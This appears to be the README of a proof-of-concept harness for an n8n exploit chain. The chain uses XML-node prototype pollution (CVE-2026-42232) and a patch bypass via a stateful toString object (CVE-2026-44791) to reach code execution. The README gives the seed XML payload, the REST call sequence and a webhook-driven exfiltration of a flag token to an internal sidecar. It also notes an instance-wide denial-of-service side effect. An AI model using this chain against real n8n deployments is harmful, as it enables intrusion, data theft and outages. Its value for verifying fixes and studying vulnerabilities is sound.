# n8n-cve-2026-44791 

Chain: **CVE-2026-42232** (GHSA-hqr4-h3xv-9m3r, XML node prototype pollution → RCE)
→ **CVE-2026-44791** (GHSA-wrwr-h859-xh2r, "bypass the patch for CVE-2026-42232 in the
XML node", fixed 1.123.43 / 2.20.7 / 2.22.1). Both advisories: an authenticated user with
permission to create/modify workflows; combined with other nodes → RCE on the n8n host.

## Versions (official `n8nio/n8n` images, SQLite, default user management)
| | image | state |
|---|---|---|
| V0 | `n8nio/n8n:2.17.3` | no `sanitizeXmlName`, no attrkey/charkey validation (pre-CVE1) |
| V1 | `n8nio/n8n:2.20.6` | CVE1 fix active; **coercion TOCTOU open (target)** |
| V2 | `n8nio/n8n:2.20.7` | CVE2 fix: `options.attrkey = String(options.attrkey)` |

## Mechanism (source-verified)
1. **CVE1 (seed)** — xml2js creates an OWN `__proto__` key for a `<__proto__>` tag
   (`Object.defineProperty`, bypassing the setter). `n8n-workflow`'s `deepCopy` executes
   `clone['__proto__'] = copiedValue` → the copied item's PROTOTYPE becomes the attacker's
   element object, so `$json.root[1].pcb_seed_flag` resolves the planted token through the
   prototype chain. V0: works. V1: `sanitizeXmlName` renames the tag → blocked.
2. **CVE2 (residual)** — the 2.17.4 fix validates `options.attrkey` on a **copied** string
   but passes the **raw** value to the xml2js Parser. A stateful `toString()` object
   (`{ toString: () => ++calls === 1 ? 'safe' : '__proto__' }`) built by the vm2 Function
   node (main process) and delivered via the expression `={{ $json.evil }}` passes the
   validation ('safe') and then makes xml2js re-coerce to `'__proto__'`:
   `defineProperty(obj['__proto__'], attrName, value)` → **global Object.prototype
   pollution** → `$json.pcb_res_flag` exfils the token. V2: options mutated to the stable
   string → blocked.

## PoC (real HTTP)
- owner setup + login → `POST /rest/workflows` (webhook trigger + XML node + HTTP node) → activate → `POST /webhook/{path}`.
- seed: text/plain XML `<root><__proto__><pcb_seed_flag>FLAG</pcb_seed_flag></__proto__></root>`.
- residual: `{}` body; Function node generates the XML + stateful object.
- exfil: HTTP node GET `http://sidecar:8000/ingest?seed=|res=` + expression; flag token in
  sidecar hit log (sidecar is internal-only, PCB_FLAG in its environment).

## Gate (strict, 4 edges — passed twice on real Docker)
| edge | result |
|---|---|
| seed@V0 | flag in sidecar (`/ingest?seed=PCBFLAG_...`) |
| seed@V1 | no flag (`/ingest?seed=` empty) |
| residual@V1 | flag in sidecar (`/ingest?res=PCBFLAG_...`) |
| residual@V2 | no flag (`/ingest?res=` empty) |

## Gotchas
- n8n 2.x backend evaluates ONLY `=`-prefixed expressions; embedded `{{ }}` in the HTTP
  node URL is not interpolated server-side — use `={{ '...' + $json.x }}`.
- Manual trigger always emits `{}`; use a **Webhook** trigger to inject attacker data.
- The residual pollutes the global Object.prototype in the V1 process, which breaks n8n's
  own TypeORM login/save queries (`Property "pcb_res_flag" was not found in "User"` — the
  instance-wide DoS side effect); the oracle restarts the container between probes and
  waits for the sidecar hit (execution can take 1–3 min).
- Function node (`n8n-nodes-base.function`, hidden/deprecated) is still registered in all
  three images and runs vm2 in the main process — the delivery vehicle for the stateful
  object ("combined with other nodes" per the advisory).
- Workflow activation needs `{versionId}` from the create response; deactivate all prior
  workflows so a unique webhook path is the only one registered.
